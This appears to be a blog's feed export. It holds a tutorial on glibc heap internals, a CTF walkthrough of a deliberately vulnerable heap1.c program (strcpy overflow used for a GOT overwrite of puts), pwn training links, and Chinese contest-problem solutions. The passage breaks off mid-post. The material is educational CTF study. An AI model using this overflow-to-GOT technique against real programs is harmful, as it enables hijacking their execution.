    <published>2022-06-05T14:43:16.000Z</published>
    <updated>2022-05-29T15:46:38.365Z</updated>
    
    <content type="html"><![CDATA[<p>There are some cases about heap you want.</p><span id="more"></span><h2 id="0x01-System-call-mmap-brk"><a href="#0x01-System-call-mmap-brk" class="headerlink" title="0x01 System call - mmap, brk"></a>0x01 System call - mmap, brk</h2><ul><li>malloc get memory firstly</li></ul><img src="\images\mmap_brk.png"><ul><li>system calls - ask the kernel directly<ul><li>mmap()<ul><li>ask kernel give us some <em>new virtual addresses</em></li></ul></li><li>brk()<ul><li>change <strong>data segment</strong> <em>size</em></li></ul></li></ul></li></ul><blockquote><p>process doesn’t care how the memory is implemented.</p></blockquote><p>allocated memory through <code>Linux Kernel</code> and <code>CPU's MMU</code> etc map to process. Then <strong>process</strong> can <em>transparently</em> access these <strong>memory</strong>.</p><img src="\images\getMoreMem.png"><p>In CTF match, we use very little space to malloc, so brk system call doesn’t appear.</p><p>How malloc work?</p><h2 id="0x02-malloc-implement"><a href="#0x02-malloc-implement" class="headerlink" title="0x02 malloc implement"></a>0x02 malloc implement</h2><p>Easily we consider the large region as heap.</p><p>Now, we want a size 8 memory to write some chars like <code>AAAABBBB</code>. use <code>malloc(8)</code>. Then return a address can be writed.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804000</span><br><span class="line">| A A A A | B B B B |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804010</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804020</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804030</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804040</span><br></pre></td></tr></table></figure><p>If <code>malloc(8)</code> again, what will happen</p><p>guess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804000</span><br><span class="line">| A A A A | B B B B | A A A A | B B B B |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804010</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804020</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804030</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804040</span><br></pre></td></tr></table></figure><p>if this is reality, some questions here.</p><ul><li>how does malloc know what address to return?</li><li>how does malloc know which areas are still free?</li></ul><p>some implement here.</p><h3 id="DLmalloc"><a href="#DLmalloc" class="headerlink" title="DLmalloc"></a>DLmalloc</h3><p>most common use in malloc.</p><h4 id="workflow"><a href="#workflow" class="headerlink" title="workflow"></a>workflow</h4><ul><li><strong>store</strong> for each chunk it <strong>blocks</strong> the <em>size</em> of chunk right before it.</li><li>keep 4 bytes before chunk (before freed)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ret_addr: 0x804008</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804000</span><br><span class="line">|         |size:0x10| A A A A | B B B B |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804010</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804020</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804030</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804040</span><br></pre></td></tr></table></figure><p>first malloc return address can be calculated equal 0x804000+0x8=0x804008</p><p>Then, how does malloc know the next address after called where the next chunk can be placed?</p><p>If start of the free/available area: 0x804000, next chunk address at start + now_chunk_size, so at 0x804000 + 0x10(size) = 0x804010. The will happen at malloc of system calls.</p><p>So there is a point somewhere at always point to a free memory.</p><img src="\images\top_chunk.png"><p>Given the returned address of malloc, what can we do with that?</p><ul><li>Writable data addr: this pointer points to the start where we can write data to.</li><li>Size of chunk: before writable data addr.</li><li>Next chunk addr: <code>start of current chunk addr</code> add <code>size of this chunk</code></li></ul><h2 id="0x03-small-code-cases"><a href="#0x03-small-code-cases" class="headerlink" title="0x03 small code cases"></a>0x03 small code cases</h2><p>heap1.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">internet</span> {</span></span><br><span class="line">    <span class="type">int</span>     priority;</span><br><span class="line">    <span class="type">char</span>    *name;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">winner</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">internet</span> *<span class="title">i1</span>, *<span class="title">i2</span>, *<span class="title">i3</span>;</span></span><br><span class="line"></span><br><span class="line">    i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</span><br><span class="line">    i1-&gt;priority = <span class="number">1</span>;</span><br><span class="line">    i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</span><br><span class="line">    i2-&gt;priority = <span class="number">1</span>;</span><br><span class="line">    i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><ul><li>objective -&gt; winner</li><li>struct <em>internet</em><ul><li>first member: priority, (type): int</li><li>second member: name, (type): char point (means contain a point to a string somewhere else)</li></ul></li></ul><p><code>*</code>pointer(meaning: contains an address)</p><img src="\images\struct.png"><p>In 32-Bit machine, point size(a address size) equal 4 bits, but 8 bits in 64-Bit machine.</p><p><code>malloc(sizeof(struct internet))</code>So a chunk size: 4(int) + 4(char *) = 8 (tests in 32Bit) <code>i1-&gt;priority = 1;</code> write 1 to the first 4 byte of the allocated area.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> int priority  char *name</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804d198(i1=0x804d198+8)</span><br><span class="line">|         |size:0x10|   0x1   |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804d1a8</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804d1b8</span><br><span class="line">|         |         |         |         |</span><br><span class="line">+—————————+—————————+—————————+—————————+ &lt;- 0x804d1c8</span><br></pre></td></tr></table></figure><p>name point at offset = 4 of i1 object(name point at: i1 + 4).<code>i1-&gt;name = malloc(8);</code>Then it allocates another 8 byte, and the resulting address will stored in the char point name. Those 8 bytes are intended to store a list of characters. </p><p>As a programmer, we use <code>i1-&gt;name</code> to access name member property. As simply going to a certain offset of i1, in this case i1+4 is the location of the char point name. <code>i1-&gt;name [(0x804d198+8)+4]</code>. <code>[num]</code> express access address in the num address which means fetch info indirectly.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d008</span><br><span class="line">Size: 0x191</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d198</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804d1a8</span><br><span class="line">Size: 0x21e59</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/12wx 0x804d198</span><br><span class="line">0x804d198:      0x00000000      0x00000011      0x00000000      0x00000000</span><br><span class="line">0x804d1a8:      0x00000000      0x00021e59      0x00000000      0x00000000</span><br></pre></td></tr></table></figure><p>i2 looks like i1.</p><p>We enable the <code>argv[1] = "aaaabbbb", argv[2] = "aaaabbbb";</code>, so heap info behind.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r aaaabbbb aaaabbbb</span><br><span class="line">pwndbg&gt; ...</span><br><span class="line">pwndbg&gt; x/22wx 0x804d198</span><br><span class="line">0x804d198:      0x00000000      0x00000011      0x00000001      0x0804d1b0 &lt;- i1's priority, *name</span><br><span class="line">0x804d1a8:      0x00000000      0x00000011      0x61616161      0x62626262 &lt;- il's name content</span><br><span class="line">0x804d1b8:      0x00000000      0x00000011      0x00000001      0x0804d1d0 &lt;- i2's priority, *name</span><br><span class="line">0x804d1c8:      0x00000000      0x00000011      0x61616161      0x62626262 &lt;- i2's name content</span><br><span class="line">0x804d1d8:      0x00000000      0x00021e29      0x00000000      0x00000000</span><br></pre></td></tr></table></figure><p>a dangerous function! <code>strcpy</code></p><p><code>strcpy</code> has no length check. So we can overflow name when write over 8 byte and really screw up stuff.</p><p>size low bit indicate that the PREVIOUS chunk is used, so we find it is 0x11 not 0x10. That becomes more important for the <code>free()</code></p><p>The dlmalloc is not really the original dlmalloc. It is usually referred to as ptmalloc.</p><h2 id="0x04-overwrite"><a href="#0x04-overwrite" class="headerlink" title="0x04 overwrite"></a>0x04 overwrite</h2><p>heap overflow works not well. overwrite somewhat? It actually is called <strong>got overwrite</strong>.</p><p>GOT - <code>_GLOBAL_OFFSET_TABLE_</code> : record function offset in program running.</p><p>function call use the plt addr.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt; 0x08049312 &lt;+192&gt;:   call   0x80490e0 &lt;puts@plt&gt;</span><br><span class="line">pwndbg&gt; disassemble 0x80490e0</span><br><span class="line">Dump of assembler code for function puts@plt:</span><br><span class="line">   0x080490e0 &lt;+0&gt;:     endbr32 </span><br><span class="line">   0x080490e4 &lt;+4&gt;:     jmp    DWORD PTR ds:0x804c01c  &lt;-puts@got</span><br><span class="line">   0x080490ea &lt;+10&gt;:    nop    WORD PTR [eax+eax*1+0x0]</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>we need pad some chars to overwrite the i2 name point address.</p><p>it looks like this.</p><img src="\images\heap_got.png"><p>If we write on i2 name, what will happen?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x 0x804c01c</span><br><span class="line">0x804c01c &lt;puts@got.plt&gt;:       0xf7e33c40 &lt;- puts in libc.6</span><br></pre></td></tr></table></figure><img src="\images\over.png"><img src="\images\addr_tar.png"><p>so payload</p><img src="\images\over_pay.png"><p>or</p><img src="\images\over_pay2.png">]]></content>
    
    
    <summary type="html">&lt;p&gt;There are some cases about heap you want.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="http://im0use.github.io/2022/06/01/unlink/"/>
    <id>http://im0use.github.io/2022/06/01/unlink/</id>
    <published>2022-06-01T14:43:16.000Z</published>
    <updated>2022-05-29T00:57:47.082Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pwn way</title>
    <link href="http://im0use.github.io/2022/05/22/pwn-way/"/>
    <id>http://im0use.github.io/2022/05/22/pwn-way/</id>
    <published>2022-05-22T15:39:01.000Z</published>
    <updated>2022-05-22T15:42:31.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hitcon-train"><a href="#hitcon-train" class="headerlink" title="hitcon train"></a>hitcon train</h2><p><a href="https://github.com/scwuaptx/HITCON-Training">https://github.com/scwuaptx/HITCON-Training</a></p><h2 id="hitcon-bilibili"><a href="#hitcon-bilibili" class="headerlink" title="hitcon bilibili"></a>hitcon bilibili</h2><p><a href="https://www.bilibili.com/video/BV1Xt411y7Pg">https://www.bilibili.com/video/BV1Xt411y7Pg</a></p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>bash-c: <a href="https://github.com/bash-c/HITCON-Training-Writeup">https://github.com/bash-c/HITCON-Training-Writeup</a></p><h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><h2 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h2><blockquote><p>这些学完岂不是神中神，</p><p>可惜学不得。</p></blockquote><h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><p><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;hitcon-train&quot;&gt;&lt;a href=&quot;#hitcon-train&quot; class=&quot;headerlink&quot; title=&quot;hitcon train&quot;&gt;&lt;/a&gt;hitcon train&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/sc</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>acm_solve</title>
    <link href="http://im0use.github.io/2022/05/19/acm_solve/"/>
    <id>http://im0use.github.io/2022/05/19/acm_solve/</id>
    <published>2022-05-18T16:38:56.000Z</published>
    <updated>2022-05-29T01:04:52.547Z</updated>
    
    <content type="html"><![CDATA[<p>马上省赛，为了应付一下这个考试，得看看往年题，总结一下经验。</p><span id="more"></span><h2 id="B-Build-Roads"><a href="#B-Build-Roads" class="headerlink" title="B. Build Roads"></a>B. Build Roads</h2><p>一个王国，有n个城市。想建n-1条边连接城市，第i个城市有一个建筑公司经验值为ai。想在i和j城市之间建一条路，需要两个城市的建筑公司互相竞争，在修路中两家公司会起冲突，从而造成材料浪费。浪费材料为gcd(ai,aj)</p><p>请设计一条路连接n个城市用n条边，花费最少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gen</span><span class="params">()</span> {<span class="comment">// a[i] = gen()</span></span><br><span class="line">    <span class="keyword">return</span> xorshitf64() % (R - L + <span class="number">1</span>) + L;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>分析：如果R = L，那么ai = L，相邻城市之间花费L，总花费L*(n-1)。如果R ≠  L，n较小时暴力连边建生成树(n^2)；如果n较大，若R - L + 1较大，根据素数分布，素数相距大概几百左右，这样L到(R - L + 1) + L之间必然有一个素数，有一个数为素数，gcd就为1，答案为(n - 1)，若R - L + 1较小，R - L + 1区间之内会被取满，根据连续的两个数必然互质可得结果仍然为(n - 1)。</p><p>暴力建树，单向建边，取其中任意n-1条边一定会把n个城市给连在一起。所以不需要并查，直接排序依据最小权取n-1个即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; e;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) a[i] = <span class="built_in">gen</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        e.<span class="built_in">push_back</span>(__gcd(a[i], a[j]));</span><br><span class="line"><span class="built_in">sort</span>(e.<span class="built_in">begin</span>(), e.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++) ans += e[i];</span><br><span class="line"><span class="comment">// output ans</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当n较大时</span></span><br><span class="line">ans = n - <span class="number">1</span>;</span><br><span class="line"><span class="comment">// L = R时</span></span><br><span class="line">ans = (n - <span class="number">1</span>) * L;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> ull = <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line">ull n, L, R, seed, a[<span class="number">200002</span>];</span><br><span class="line"><span class="function">ull <span class="title">xorshift64</span><span class="params">()</span> </span>{</span><br><span class="line">ull x = seed;</span><br><span class="line">x ^= x &lt;&lt; <span class="number">13</span>;</span><br><span class="line">x ^= x &gt;&gt; <span class="number">7</span>;</span><br><span class="line">x ^= x &lt;&lt; <span class="number">17</span>;</span><br><span class="line"><span class="keyword">return</span> seed = x;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gen</span><span class="params">()</span> </span>{</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">xorshift64</span>() % (R - L + <span class="number">1</span>) + L;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">ull ans = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; L &gt;&gt; R &gt;&gt; seed;</span><br><span class="line"><span class="keyword">if</span> (L == R) ans = (n - <span class="number">1</span>) * L;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt;= <span class="number">20</span>) {</span><br><span class="line">        vector&lt;ull&gt; e;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) a[i] = <span class="built_in">gen</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                e.<span class="built_in">push_back</span>(__gcd(a[i], a[j]));</span><br><span class="line">        <span class="built_in">sort</span>(e.<span class="built_in">begin</span>(), e.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) ans += e[i];</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        ans = n - <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="C-Cat-Virus"><a href="#C-Cat-Virus" class="headerlink" title="C. Cat Virus"></a>C. Cat Virus</h2><p>一个国家，有很多族可以被视为有根树。一个族包含黑色和白色，改族新生儿可能是黑色，如果一个新生儿是黑色，那么它的后代也是黑色。</p><p>给一个整数k，可以有k种方式标记黑色和白色组成家族成员。两种方式肯定有不完全相同的成员，至少有一个黑色，而另一个为白色。</p><p>问如何建一个有根树使得方式为k。</p><p>设f(u)为染色u及u所有子树的方案树，若将u染成黑色，则只有一种方案，若将u染成白色，则设u的子节点为v，f(u)=proc(f(v))+1，u方案数为子树方案数之积在加上黑色的一种方案。各子树之间互不影响，所以是乘积。</p><p>若k为奇数，我们给k弄一个左儿子和右儿子，向右儿子方向走，f(r) = (k - 1) / 2，f(l) = 2, f(u) = f(l) * f(r) + 1，若k为偶数，我们直接让u连接一个子节点，然后到下一层，方案数边成k - 1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> ull = <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line">vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; ans;</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> pw)</span> </span>{ <span class="comment">// idx-序号，pw-方案数 </span></span><br><span class="line"><span class="keyword">if</span> (pw &lt; <span class="number">3</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (pw == <span class="number">3</span>) {</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(idx, idx + <span class="number">1</span>));</span><br><span class="line">res++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (pw &amp; <span class="number">1</span>) {</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(idx, idx + <span class="number">1</span>));</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(idx, idx + <span class="number">2</span>));</span><br><span class="line">res += <span class="number">2</span>;</span><br><span class="line"><span class="built_in">dfs</span>(idx + <span class="number">2</span>, pw &gt;&gt; <span class="number">1</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(idx, idx + <span class="number">1</span>));</span><br><span class="line">res++;</span><br><span class="line"><span class="built_in">dfs</span>(idx + <span class="number">1</span>, pw - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">cin &gt;&gt; k;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">2</span>) {</span><br><span class="line">cout &lt;&lt; <span class="string">"1"</span> &lt;&lt; <span class="string">"\n"</span>; <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (k == <span class="number">3</span>) {</span><br><span class="line">cout &lt;&lt; <span class="string">"2\n1 2\n"</span>; <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">dfs</span>(<span class="number">1</span>, k);</span><br><span class="line">cout &lt;&lt; res + <span class="number">1</span> &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i: ans) {</span><br><span class="line">cout &lt;&lt; i.first &lt;&lt; <span class="string">" "</span> &lt;&lt; i.second &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="D-Dyson-Box"><a href="#D-Dyson-Box" class="headerlink" title="D. Dyson Box"></a>D. Dyson Box</h2><p>一个盒子二维方格，左下角坐标为（0，0），右上角坐标为（2×10 ^ 5，2×10 ^ 5）。</p><p>将有n个事件发生，第i次事件时出现一个立方体，左下角坐标为（xi-1，yi-1），右上角坐标为（xi，yi）。</p><p>盒子里有两个地心引力的方向，水平和竖直，有一半的可能是水平，剩下一半是竖直。她开始测量所有立方体轮廓的总长。如果引力方向是水平，所有立方体水平向左移动，如果是竖直，则竖直向下移动。</p><p>计算每次事件后两种情况（两种情况是指向左移动或向下移动）的轮廓总长。</p><p>对于竖直情况，当已经有一块，添加下一块时要减去2，对于旁边的两列，如果旁边两栋大楼更高，就减2。</p><p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/xxx.3r9r0or8gok0.webp" alt="xxx"></p><p><img 